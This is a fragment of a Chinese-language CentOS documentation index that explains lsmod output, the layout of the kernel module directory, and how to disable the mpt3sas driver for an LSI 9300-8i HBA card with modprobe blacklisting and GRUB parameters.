\u5c55\u793a\u7684\u662f\u5f53\u524d\u7cfb\u7edf\u4e0a\u52a0\u8f7d\u7684\u5185\u6838\u6a21\u5757\uff08\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002\u6bcf\u4e00\u884c\u4ee3\u8868\u4e00\u4e2a\u6a21\u5757\uff0c\u5206\u522b\u5217\u51fa\u4e86\u6a21\u5757\u7684\u540d\u79f0\u3001\u5927\u5c0f\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u4ee5\u53ca\u4f7f\u7528\u5b83\u7684\u5b9e\u4f8b\u6570\u91cf\uff08\u5982\u679c\u6709\u5176\u4ed6\u6a21\u5757\u4f9d\u8d56\u4e8e\u6b64\u6a21\u5757\uff0c\u6216\u8005\u8be5\u6a21\u5757\u6b63\u5728\u88ab\u7cfb\u7edf\u6216\u8bbe\u5907\u4f7f\u7528\uff0c\u8fd9\u4e2a\u6570\u5b57\u5c31\u4f1a\u5927\u4e8e0\uff09\u3002 \u4f8b\u5982\uff0c\u7b2c\u4e00\u884c\u663e\u793a\u4e86 binfmt_misc \u6a21\u5757\uff0c\u5927\u5c0f\u4e3a17468\u5b57\u8282\uff0c\u88ab\u4e00\u4e2a\u5b9e\u4f8b\u4f7f\u7528\u3002\u800c tcp_diag \u6a21\u5757\uff0c\u5927\u5c0f\u4e3a12591\u5b57\u8282\uff0c\u76ee\u524d\u6ca1\u6709\u88ab\u4f7f\u7528\uff08Used by\u4e3a0\uff09\u3002\u5982\u679c\u88ab\u4f7f\u7528\uff0c\u90a3\u4e48\u4f7f\u7528\u65b9\u5c06\u4f1a\u540e\u9762\u663e\u793a \u8fd9\u4e2a\u5217\u8868\u57fa\u672c\u4e0a\u662f\u4f60\u7684\u7cfb\u7edf\u5f53\u524d\u4f7f\u7528\u7684\u6240\u6709\u786c\u4ef6\u548c\u6587\u4ef6\u7cfb\u7edf\u76f8\u5173\u7684\u9a71\u52a8\u7a0b\u5e8f\u7684\u6982\u89c8\u3002\u901a\u8fc7\u8fd9\u4e2a\u5217\u8868\uff0c\u4f60\u53ef\u4ee5\u4e86\u89e3\u54ea\u4e9b\u9a71\u52a8\u7a0b\u5e8f\u5f53\u524d\u5728\u7cfb\u7edf\u4e0a\u6d3b\u8dc3\uff0c\u4ee5\u53ca\u4ed6\u4eec\u7684\u4f7f\u7528\u60c5\u51b5\u3002 \u4f9d\u6b21\u89e3\u91ca\u8fd955\u884c lsmod \u547d\u4ee4\u7684\u8f93\u51fa\u7ed3\u679c\uff1a binfmt_misc - \u652f\u6301\u53ef\u6267\u884c\u6587\u4ef6\u7684\u591a\u79cd\u683c\u5f0f\u3002 tcp_diag - \u7528\u4e8eTCP\u7f51\u7edc\u8bca\u65ad\u3002 inet_diag - \u7f51\u7edc\u8bca\u65ad\u6846\u67b6\uff0c\u7531tcp_diag\u4f7f\u7528\u3002 iptable_filter - Netfilter\u7684IPv4\u8fc7\u6ee4\u89c4\u5219\u8868\u3002 nls_utf8 - \u652f\u6301UTF-8\u7f16\u7801\u3002 isofs - ISO 9660\u6587\u4ef6\u7cfb\u7edf\u652f\u6301\uff0c\u7528\u4e8e\u8bfb\u53d6CD/DVD\u3002 iosf_mbi - \u7528\u4e8eIntel\u5e73\u53f0\u7684\u6d88\u606f\u603b\u7ebf\u63a5\u53e3\u9a71\u52a8\u3002 crc32_pclmul - \u4f7f\u7528PCLMULQDQ\u6307\u4ee4\u7684CRC32\u6821\u9a8c\u3002 ghash_clmulni_intel - AES-GCM\u7684Intel\u786c\u4ef6\u52a0\u901f\u3002 ppdev - \u5e76\u53e3\u8bbe\u5907\u9a71\u52a8\u3002 aesni_intel - Intel AES-NI\u6307\u4ee4\u96c6\u652f\u6301\u3002 lrw - LRW\uff08\u7ebf\u6027\u76f8\u5173-\u4e58\u6cd5\uff09\u5757\u5bc6\u7801\u6a21\u5f0f\u3002 gf128mul - GF(2^128)\u57df\u7684\u4e58\u6cd5\u652f\u6301\u3002 glue_helper - \u7528\u4e8e\u52a0\u5bc6\u7b97\u6cd5\u7684\u5e2e\u52a9\u51fd\u6570\u3002 ablk_helper - \u5f02\u6b65\u5757\u5bc6\u7801\u5e2e\u52a9\u51fd\u6570\u3002 cryptd - \u52a0\u5bc6\u7b97\u6cd5\u7684\u8f6f\u4ef6\u5b9e\u73b0\u3002 joydev - \u6e38\u620f\u624b\u67c4\u8bbe\u5907\u9a71\u52a8\u3002 sg - SCSI\u901a\u7528\uff08sg\uff09\u9a71\u52a8\u3002 virtio_balloon - Virtio\u5185\u5b58\u6c14\u7403\u9a71\u52a8\uff0c\u7528\u4e8e\u8c03\u6574\u865a\u62df\u673a\u7684\u5185\u5b58\u5206\u914d\u3002 pcspkr - PC\u626c\u58f0\u5668\u9a71\u52a8\u3002 parport_pc - PC\u5e76\u53e3\u9a71\u52a8\u3002 i2c_piix4 - AMD/Intel I2C\u603b\u7ebf\u9a71\u52a8\u3002 parport - \u5e76\u884c\u7aef\u53e3\uff08printer port\uff09\u8bbe\u5907\u652f\u6301\u3002 ip_tables - IPv4\u9632\u706b\u5899\uff08Netfilter\uff09\u652f\u6301\u3002 ext4 - EXT4\u6587\u4ef6\u7cfb\u7edf\u9a71\u52a8\u3002 mbcache - EXT\u6587\u4ef6\u7cfb\u7edf\u7684\u5143\u6570\u636e\u7f13\u5b58\u3002 jbd2 - EXT\u6587\u4ef6\u7cfb\u7edf\u7684\u65e5\u5fd7\u5757\u8bbe\u5907\u3002 sr_mod - SCSI CD-ROM\u652f\u6301\u3002 cdrom - \u901a\u7528CD-ROM\u9a71\u52a8\u3002 ata_generic - \u901a\u7528ATA\u9a71\u52a8\u3002 pata_acpi - \u652f\u6301\u901a\u8fc7ACPI\u914d\u7f6ePATA\u63a5\u53e3\u3002 virtio_net - Virtio\u7f51\u7edc\u8bbe\u5907\u9a71\u52a8\u3002 net_failover - \u7f51\u7edc\u6545\u969c\u8f6c\u79fb\u652f\u6301\u3002 virtio_blk - Virtio\u5757\u8bbe\u5907\u9a71\u52a8\u3002 failover - \u901a\u7528\u7f51\u7edc\u6545\u969c\u8f6c\u79fb\u6a21\u5757\u3002 cirrus - Cirrus\u903b\u8f91GPU\u9a71\u52a8\u3002 drm_kms_helper - DRM\uff08\u76f4\u63a5\u6e32\u67d3\u7ba1\u7406\u5668\uff09\u5185\u6838\u6a21\u5f0f\u8bbe\u7f6e\u5e2e\u52a9\u51fd\u6570\u3002 syscopyarea - \u5185\u6838\u5e27\u7f13\u51b2\u590d\u5236\u533a\u57df\u652f\u6301\u3002 sysfillrect - \u5185\u6838\u5e27\u7f13\u51b2\u586b\u5145\u77e9\u5f62\u652f\u6301\u3002 sysimgblt - \u5185\u6838\u5e27\u7f13\u51b2\u56fe\u50cf\u4f4d\u5757\u4f20\u8f93\u652f\u6301\u3002 fb_sys_fops - \u5185\u6838\u5e27\u7f13\u51b2\u7cfb\u7edf\u6587\u4ef6\u64cd\u4f5c\u652f\u6301\u3002 ttm - \u5185\u6838\u7684\u8f6c\u6362\u548c\u7f13\u5b58\u7ba1\u7406\u5668\uff08TTM\uff09\u3002 crct10dif_pclmul - \u4f7f\u7528PCLMULQDQ\u6307\u4ee4\u7684CRC-T10DIF\u6821\u9a8c\u3002 crct10dif_common - CRC-T10DIF\u6821\u9a8c\u901a\u7528\u51fd\u6570\u3002 crc32c_intel - \u4f7f\u7528Intel\u786c\u4ef6\u52a0\u901f\u7684CRC32c\u6821\u9a8c\u3002 ata_piix - Intel PIIX/ICH ATA\u63a7\u5236\u5668\u9a71\u52a8\u3002 drm - \u76f4\u63a5\u6e32\u67d3\u7ba1\u7406\u5668\uff08DRM\uff09\u652f\u6301\u3002 serio_raw - \u539f\u59cb\u4e32\u884cI/O\u63a5\u53e3\u9a71\u52a8\u3002 libata - \u901a\u7528ATA/ATAPI\u9a71\u52a8\u5e93\u3002 virtio_pci - Virtio PCI\u603b\u7ebf\u9a71\u52a8\u3002 virtio_ring - Virtio\u73af\u7f13\u51b2\u533a\u7ba1\u7406\u3002 virtio - Virtio\u6838\u5fc3\u6846\u67b6\u3002 drm_panel_orientation_quirks - \u7528\u4e8e\u7279\u5b9a\u9762\u677f\u7684DRM\u5c4f\u5e55\u65b9\u5411\u95ee\u9898\u4fee\u6b63\u3002 floppy - \u8f6f\u76d8\u9a71\u52a8\u3002","title":"1.\u67e5\u770b\u52a0\u8f7d\u7684\u6a21\u5757\uff1a"},{"location":"system/centos7/CentOS%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E9%A9%B1%E5%8A%A8/#2","text":"\u8981\u67e5\u770b\u7cfb\u7edf\u53ef\u7528\u7684\u6240\u6709\u5185\u6838\u6a21\u5757\uff08\u4e0d\u4ec5\u4ec5\u662f\u5f53\u524d\u52a0\u8f7d\u7684\uff09\uff0c\u4f60\u53ef\u4ee5\u5728 /lib/modules/$(uname -r) \u76ee\u5f55\u4e0b\u67e5\u627e\u3002\u8fd9\u91cc\u7684 $(uname -r) \u4f1a\u88ab\u66ff\u6362\u4e3a\u4f60\u5f53\u524d\u8fd0\u884c\u7684\u5185\u6838\u7248\u672c\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a ls /lib/modules/$(uname -r)/kernel/drivers/ \u8fd9\u4e2a\u547d\u4ee4\u5c06\u663e\u793a\u5f53\u524d\u7cfb\u7edf\u7248\u672c\u6240\u6709\u53ef\u7528\u7684\u9a71\u52a8\u7a0b\u5e8f\u6a21\u5757\uff0c\u7ec4\u7ec7\u5728\u4e0d\u540c\u7684\u5b50\u76ee\u5f55\u4e0b\uff0c\u5982 net \uff08\u7f51\u7edc\uff09\u3001 scsi \uff08\u5b58\u50a8\u63a7\u5236\u5668\uff09\u3001 video \uff08\u89c6\u9891\u8bbe\u5907\uff09\u7b49\u3002 \u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u5c55\u793a\u7684\u662f\u7cfb\u7edf\u4e2d\u53ef\u7528\u6216\u8005\u5df2\u52a0\u8f7d\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4f46\u5e76\u4e0d\u610f\u5473\u7740\u6240\u6709\u8fd9\u4e9b\u9a71\u52a8\u90fd\u662f\u5728\u5185\u6838\u7f16\u8bd1\u65f6\u9884\u88c5\u7684\u3002\u4e00\u4e9b\u9a71\u52a8\u53ef\u80fd\u662f\u5728\u540e\u7eed\u8fc7\u7a0b\u4e2d\u6dfb\u52a0\u7684\uff0c\u5c24\u5176\u662f\u5728\u4f7f\u7528\u5b9a\u5236\u6216\u8005\u7b2c\u4e09\u65b9\u5185\u6838\u65f6\u3002 \u4ee5\u6211\u7684\u817e\u8baf\u4e91\u4e3a\u4f8b\uff1a [root@VM-0-16-centos ~]# ls /lib/modules/$(uname -r) build modules.alias modules.builtin modules.dep.bin modules.modesetting modules.softdep source weak-updates extra modules.alias.bin modules.builtin.bin modules.devname modules.networking modules.symbols updates kernel modules.block modules.dep modules.drm modules.order modules.symbols.bin vdso \u4ee5\u4e0b\u662f\u6bcf\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u8bf4\u660e\uff1a build : \u901a\u5e38\u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u6307\u5411\u5185\u6838\u6e90\u4ee3\u7801\u7684\u4f4d\u7f6e\uff0c\u7528\u4e8e\u7f16\u8bd1\u5185\u6838\u6a21\u5757\u3002 extra : \u7528\u4e8e\u5b58\u653e\u975e\u6807\u51c6\u6216\u7b2c\u4e09\u65b9\u7684\u5185\u6838\u6a21\u5757\u3002 kernel : \u5305\u542b\u4e86\u5927\u91cf\u7684\u5b50\u76ee\u5f55\uff0c\u6bcf\u4e2a\u5b50\u76ee\u5f55\u90fd\u5305\u542b\u7279\u5b9a\u7c7b\u578b\u7684\u5185\u6838\u6a21\u5757\uff08\u5982\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002 modules.alias : \u5305\u542b\u6a21\u5757\u522b\u540d\u7684\u6620\u5c04\uff0c\u6709\u52a9\u4e8e modprobe \u547d\u4ee4\u8bc6\u522b\u8bf7\u6c42\u52a0\u8f7d\u54ea\u4e2a\u6a21\u5757\u3002 modules.alias.bin : \u662f modules.alias \u7684\u4e8c\u8fdb\u5236\u7248\u672c\uff0c\u52a0\u5feb\u5904\u7406\u901f\u5ea6\u3002 modules.block : \u53ef\u80fd\u5305\u542b\u4e0e\u5757\u8bbe\u5907\uff08\u5982\u786c\u76d8\u9a71\u52a8\uff09\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.dep : \u5305\u542b\u6a21\u5757\u95f4\u4f9d\u8d56\u5173\u7cfb\u7684\u4fe1\u606f\u3002 modules.dep.bin : \u662f modules.dep \u7684\u4e8c\u8fdb\u5236\u7248\u672c\u3002 modules.devname : \u5305\u542b\u6a21\u5757\u548c\u8bbe\u5907\u540d\u79f0\u4e4b\u95f4\u7684\u6620\u5c04\u3002 modules.drm : \u4e0e\u76f4\u63a5\u6e32\u67d3\u7ba1\u7406\u5668\uff08DRM\uff09\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.modesetting : \u4e0e\u56fe\u5f62\u6a21\u5f0f\u8bbe\u7f6e\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.networking : \u4e0e\u7f51\u7edc\u529f\u80fd\u76f8\u5173\u7684\u6a21\u5757\u4fe1\u606f\u3002 modules.order : \u5217\u51fa\u4e86\u6a21\u5757\u7684\u52a0\u8f7d\u987a\u5e8f\u3002 modules.softdep : \u63cf\u8ff0\u4e86\u6a21\u5757\u95f4\u8f6f\u4f9d\u8d56\u5173\u7cfb\u3002 modules.symbols : \u5305\u542b\u6a21\u5757\u5bfc\u51fa\u7b26\u53f7\u7684\u4fe1\u606f\u3002 modules.symbols.bin : \u662f modules.symbols \u7684\u4e8c\u8fdb\u5236\u7248\u672c\u3002 source : \u901a\u5e38\u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u6307\u5411\u5185\u6838\u6e90\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002 updates : \u7528\u4e8e\u5b58\u653e\u5185\u6838\u6a21\u5757\u7684\u66f4\u65b0\u6216\u4fee\u8865\u7a0b\u5e8f\u3002 vdso : \u4e0e\u865a\u62df\u52a8\u6001\u5171\u4eab\u5bf9\u8c61\uff08vDSO\uff09\u76f8\u5173\u7684\u4fe1\u606f\u3002 weak-updates : \u7528\u4e8e\u5b58\u653e\u5f31\u66f4\u65b0\u6a21\u5757\uff0c\u8fd9\u4e9b\u6a21\u5757\u53ef\u80fd\u4f1a\u8986\u76d6\u539f\u59cb\u6a21\u5757\u3002 modules.builtin : \u5217\u51fa\u4e86\u5185\u6838\u5185\u7f6e\u7684\u6a21\u5757\u3002 modules.builtin.bin : \u662f modules.builtin \u7684\u4e8c\u8fdb\u5236\u7248\u672c\u3002","title":"2.\u67e5\u770b\u53ef\u7528\u6a21\u5757\uff1a"},{"location":"system/centos7/CentOS%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E9%A9%B1%E5%8A%A8/#_1","text":"\u67d0\u673a\u5668\u4f7f\u7528LSI HBA\u76f4\u901a\u5361\uff0cHBA LSI 9300-8i\u5361\uff0c\u63d2\u4e0a\u540e\uff0c\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\uff0c\u67d0\u5927\u795e\u901a\u8fc7/etc/modprobe.d/blacklist.conf\u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e blacklist mpt3sas \u7981\u7528\u4e86\u8be5\u5361\u7684\u9a71\u52a8\uff0c\u7cfb\u7edf\u6210\u529f\u542f\u52a8\u3002\u56e0\u4e3a\u5ba2\u6237\u4e0d\u4f7f\u7528\u8be5\u5361\uff0c\u4f46\u662f\u5e0c\u671b\u5728\u5e26\u5916\u4e0a\u770b\u5230\u3002","title":"\u67d0\u6848\u4f8b\uff1a"},{"location":"system/centos7/CentOS%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E9%A9%B1%E5%8A%A8/#_2","text":"HBA LSI 9300-8i \u662f\u4e00\u6b3e\u7531LSI\u516c\u53f8\uff08\u73b0\u4e3aBroadcom\u7684\u4e00\u90e8\u5206\uff09\u751f\u4ea7\u7684Host Bus Adapter\uff08\u4e3b\u673a\u603b\u7ebf\u9002\u914d\u5668\uff09\u5361\u3002\u8fd9\u6b3e\u9002\u914d\u5668\u5361\u901a\u5e38\u7528\u4e8e\u8fde\u63a5\u670d\u52a1\u5668\u4e0e\u5916\u90e8\u5b58\u50a8\u7cfb\u7edf\uff0c\u5982\u786c\u76d8\u9635\u5217\u6216\u78c1\u5e26\u5e93\u3002\u5b83\u652f\u6301SAS\uff08Serial Attached SCSI\uff09\u548cSATA\uff08Serial ATA\uff09\u63a5\u53e3\uff0c\u4f7f\u5176\u80fd\u591f\u517c\u5bb9\u591a\u79cd\u5b58\u50a8\u8bbe\u5907\u3002 LSI 9300-8i \u7684\u4e3b\u8981\u7279\u70b9\u5305\u62ec\uff1a 1.\u7aef\u53e3\u6570\u91cf\u548c\u901f\u5ea6\uff1a\u6b64\u5361\u63d0\u4f9b8\u4e2aSAS/SATA\u7aef\u53e3\uff0c\u6bcf\u4e2a\u7aef\u53e3\u7684\u6570\u636e\u4f20\u8f93\u901f\u5ea6\u9ad8\u8fbe12Gb/s\uff0c\u9002\u7528\u4e8e\u9ad8\u6027\u80fd\u5b58\u50a8\u9700\u6c42\u3002 2.\u76f4\u901a\u8bbe\u8ba1\uff1a\u4f5c\u4e3a\u4e00\u6b3eHBA\u5361\uff0c9300-8i \u901a\u5e38\u4ee5\u76f4\u901a\u6a21\u5f0f\uff08pass-through mode\uff09\u5de5\u4f5c\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u5c06\u5b58\u50a8\u8bbe\u5907\u76f4\u63a5\u5448\u73b0\u7ed9\u64cd\u4f5c\u7cfb\u7edf\uff0c\u800c\u4e0d\u8fdb\u884cRAID\u6216\u5176\u4ed6\u989d\u5916\u5904\u7406\u3002 3.\u5e7f\u6cdb\u517c\u5bb9\u6027\uff1a\u652f\u6301\u591a\u79cd\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u5e73\u53f0\uff0c\u9002\u7528\u4e8e\u5404\u79cd\u4f01\u4e1a\u7ea7\u548c\u6570\u636e\u4e2d\u5fc3\u5e94\u7528\u573a\u666f\u3002 4.\u9ad8\u53ef\u9760\u6027\u548c\u6027\u80fd\uff1a\u63d0\u4f9b\u7a33\u5b9a\u548c\u9ad8\u901f\u7684\u6570\u636e\u4f20\u8f93\u80fd\u529b\uff0c\u975e\u5e38\u9002\u5408\u8981\u6c42\u9ad8\u53ef\u9760\u6027\u548c\u6027\u80fd\u7684\u5e94\u7528\u3002 LSI 9300-8i \u9002\u914d\u5668\u5361\u56e0\u5176\u4f18\u79c0\u7684\u6027\u80fd\u548c\u53ef\u9760\u6027\uff0c\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u9700\u8981\u5927\u91cf\u6570\u636e\u5b58\u50a8\u548c\u5feb\u901f\u6570\u636e\u8bbf\u95ee\u7684\u73af\u5883\u4e2d\u3002 \u7ecf\u8fc7\u67e5\u8be2\uff0c\u8fd9\u6b3e\u76f4\u901a\u5361\u5728Linux\u7684\u9a71\u52a8\u53ebmpt3sas\uff0cmpt3sas \u662f\u4e00\u4e2a\u7528\u4e8eLinux\u7cfb\u7edf\u7684\u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4e3b\u8981\u7528\u6765\u652f\u6301LSI\uff08\u73b0\u5728\u662fBroadcom\u7684\u4e00\u90e8\u5206\uff09\u751f\u4ea7\u7684SAS 3.0\uff08Serial Attached SCSI \u7b2c\u4e09\u4ee3\uff09\u63a7\u5236\u5668\u3002\u8fd9\u4e9b\u63a7\u5236\u5668\u5305\u62ec\u4f46\u4e0d\u9650\u4e8eLSI SAS 9300\u7cfb\u5217\u5361\uff0c\u4f8b\u5982\u524d\u6587\u63d0\u5230\u7684LSI 9300-8i HBA\u5361\u3002 \u8fd9\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u4f7f\u5f97Linux\u64cd\u4f5c\u7cfb\u7edf\u80fd\u591f\u8bc6\u522b\u548c\u6709\u6548\u5730\u4e0e\u5b89\u88c5\u6709LSI SAS\u63a7\u5236\u5668\u7684\u786c\u4ef6\u901a\u4fe1\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u8fde\u63a5\u5230\u8fd9\u4e9b\u63a7\u5236\u5668\u7684\u5b58\u50a8\u8bbe\u5907\uff08\u5982\u786c\u76d8\u3001\u56fa\u6001\u786c\u76d8\u6216\u78c1\u5e26\u9a71\u52a8\u5668\uff09\u7684\u7ba1\u7406\u548c\u8bbf\u95ee\u3002 \u7b80\u800c\u8a00\u4e4b\uff0cmpt3sas \u662f Linux \u7cfb\u7edf\u4e0b\u7528\u6765\u786e\u4fdd\u670d\u52a1\u5668\u6216\u8ba1\u7b97\u673a\u53ef\u4ee5\u6b63\u786e\u8bc6\u522b\u5e76\u4f7f\u7528\u57fa\u4e8e LSI SAS 3.0 \u6280\u672f\u7684\u5b58\u50a8\u63a7\u5236\u5668\u7684\u5173\u952e\u8f6f\u4ef6\u7ec4\u4ef6\u3002 \u4e0d\u662f\u6240\u6709LSI\u7684\u9a71\u52a8\u90fd\u53ebmpt3sas\u3002mpt3sas \u662f\u7528\u4e8e\u7279\u5b9aLSI SAS\u63a7\u5236\u5668\u7684Linux\u9a71\u52a8\u7a0b\u5e8f\uff0c\u5c24\u5176\u662f\u652f\u6301SAS 3.0\uff0812Gb/s\uff09\u89c4\u683c\u7684\u63a7\u5236\u5668\u3002\u7136\u800c\uff0cLSI\u751f\u4ea7\u4e86\u591a\u79cd\u4e0d\u540c\u7c7b\u578b\u548c\u4ee3\u7684SAS\u63a7\u5236\u5668\uff0c\u8fd9\u4e9b\u63a7\u5236\u5668\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u4f8b\u5982\uff0c\u9488\u5bf9\u8f83\u65e9\u4ee3\u7684SAS\u63a7\u5236\u5668\uff08\u5982SAS 2.0\uff09\uff0c\u53ef\u80fd\u4f7f\u7528\u7684\u662fmpt2sas\u9a71\u52a8\u3002\u8fd8\u6709\u9488\u5bf9\u7279\u5b9a\u578b\u53f7\u548c\u529f\u80fd\uff08\u6bd4\u5982RAID\u529f\u80fd\uff09\u7684\u63a7\u5236\u5668\uff0c\u53ef\u80fd\u4f1a\u6709\u4e13\u7528\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u56e0\u6b64\uff0c\u9009\u62e9\u9a71\u52a8\u7a0b\u5e8f\u65f6\u9700\u8981\u57fa\u4e8e\u5177\u4f53\u7684\u786c\u4ef6\u578b\u53f7\u548c\u64cd\u4f5c\u7cfb\u7edf\u6765\u786e\u5b9a\u9002\u5408\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002\u901a\u5e38\uff0c\u53ef\u4ee5\u5728\u786c\u4ef6\u5236\u9020\u5546\u7684\u5b98\u65b9\u7f51\u7ad9\u6216\u4e0e\u60a8\u7684\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\u7684\u8f6f\u4ef6\u5e93\u4e2d\u627e\u5230\u6b63\u786e\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u5728Linux\u7cfb\u7edf\u4e2d\uff0c\u7981\u7528\u7279\u5b9a\u7684\u5185\u6838\u6a21\u5757\uff08\u5982mpt3sas\u9a71\u52a8\uff09\u53ef\u4ee5\u901a\u8fc7\u51e0\u79cd\u65b9\u5f0f\u5b9e\u73b0\u3002\u4e0b\u9762\u662f\u51e0\u79cd\u5e38\u89c1\u7684\u65b9\u6cd5\uff1a 1.\u4e34\u65f6\u7981\u7528\uff08\u5355\u6b21\u542f\u52a8\uff09 : \u5728Linux\u542f\u52a8\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u5185\u6838\u542f\u52a8\u53c2\u6570\u6765\u4e34\u65f6\u7981\u7528\u6a21\u5757\u3002\u5728\u542f\u52a8\u52a0\u8f7d\u5668\uff08\u5982GRUB\uff09\u7684\u542f\u52a8\u83dc\u5355\u4e2d\uff0c\u9009\u62e9\u8981\u542f\u52a8\u7684Linux\u5185\u6838\uff0c\u7136\u540e\u7f16\u8f91\u542f\u52a8\u53c2\u6570\uff0c\u6dfb\u52a0 modprobe.blacklist=mpt3sas \u3002\u8fd9\u6837\uff0c\u5728\u8fd9\u6b21\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0cmpt3sas\u6a21\u5757\u5c06\u4e0d\u4f1a\u88ab\u52a0\u8f7d\u3002 2.\u6c38\u4e45\u7981\u7528 : \u8981\u6c38\u4e45\u7981\u7528mpt3sas\u6a21\u5757\uff0c\u53ef\u4ee5\u5728 /etc/modprobe.d/ \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff08\u5982 blacklist.conf \uff09\uff0c\u5e76\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a blacklist mpt3sas \u4fdd\u5b58\u6587\u4ef6\u540e\uff0c\u8fd9\u4e2a\u6a21\u5757\u5728\u672a\u6765\u7684\u542f\u52a8\u4e2d\u5c06\u4e0d\u4f1a\u88ab\u81ea\u52a8\u52a0\u8f7d\u3002 3.\u901a\u8fc7\u5185\u6838\u53c2\u6570\u6c38\u4e45\u7981\u7528 : \u5bf9\u4e8e\u57fa\u4e8eRed Hat\u7684\u7cfb\u7edf\uff0c\u5982CentOS\uff0c\u6b65\u9aa4\u7c7b\u4f3c\uff0c\u4f46\u6709\u4e00\u4e9b\u7ec6\u5fae\u5dee\u522b\u3002\u4ee5\u4e0b\u662f\u5728CentOS\u7cfb\u7edf\u4e0a\u901a\u8fc7\u5185\u6838\u53c2\u6570\u6c38\u4e45\u7981\u7528\u9a71\u52a8\u7684\u6b65\u9aa4\uff1a \u7f16\u8f91GRUB\u914d\u7f6e\u6587\u4ef6\u3002\u8fd9\u901a\u5e38\u662f /etc/default/grub \u3002\u4f60\u53ef\u4ee5\u4f7f\u7528\u6587\u672c\u7f16\u8f91\u5668\u6253\u5f00\u5b83\uff0c\u4f8b\u5982\u4f7f\u7528\u547d\u4ee4\uff1a sudo vi /etc/default/grub \u627e\u5230 GRUB_CMDLINE_LINUX \u8fd9\u4e00\u884c\u3002\u5b83\u770b\u8d77\u6765\u53ef\u80fd\u50cf\u8fd9\u6837\uff1a GRUB_CMDLINE_LINUX=\"crashkernel=auto rhgb quiet\" \u6dfb\u52a0 modprobe.blacklist=mpt3sas \u5230\u8be5\u884c\u7684\u672b\u5c3e\uff0c\u4fdd\u6301\u5176\u4ed6\u53c2\u6570\u4e0d\u53d8\u3002\u4fee\u6539\u540e\u7684\u884c\u53ef\u80fd\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a GRUB_CMDLINE_LINUX=\"crashkernel=auto rhgb quiet modprobe.blacklist=mpt3sas\" \u4fdd\u5b58\u5e76\u5173\u95ed\u6587\u4ef6\u3002 \u7531\u4e8e\u60a8\u66f4\u6539\u4e86GRUB\u914d\u7f6e\uff0c\u9700\u8981\u91cd\u65b0\u751f\u6210GRUB\u914d\u7f6e\u6587\u4ef6\u3002\u5728CentOS\u4e0a\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a sudo grub2-mkconfig -o /boot/grub2/grub.cfg \u5bf9\u4e8e\u4f7f\u7528UEFI\u542f\u52a8\u7684\u7cfb\u7edf\uff0c\u8def\u5f84\u53ef\u80fd\u4e0d\u540c\uff0c\u53ef\u80fd\u9700\u8981\u4f7f\u7528\uff1a sudo grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg grub2-mkconfig \u662f\u4e00\u4e2a\u7528\u4e8e\u751f\u6210GRUB2\uff08GRand Unified Bootloader version 2\uff09\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u5de5\u5177\u3002GRUB\u662fLinux\u548c\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u7528\u6765\u7ba1\u7406\u5f15\u5bfc\u8fc7\u7a0b\u7684\u4e00\u79cd\u5f15\u5bfc\u52a0\u8f7d\u5668\u3002 \u5728\u5927\u591a\u6570\u57fa\u4e8eLinux\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c grub-mkconfig \u547d\u4ee4\u4f1a\u751f\u6210\u4e00\u4e2a\u540d\u4e3a grub.cfg \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u901a\u5e38\u4f4d\u4e8e /boot/grub/ \u6216 /boot/grub2/ \u76ee\u5f55\u4e0b\u3002\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u5305\u542b\u4e86\u542f\u52a8\u83dc\u5355\u9009\u9879\u3001\u5185\u6838\u53c2\u6570\u3001\u5f15\u5bfc\u7684\u64cd\u4f5c\u7cfb\u7edf\u5217\u8868\u7b49\u4fe1\u606f\u3002 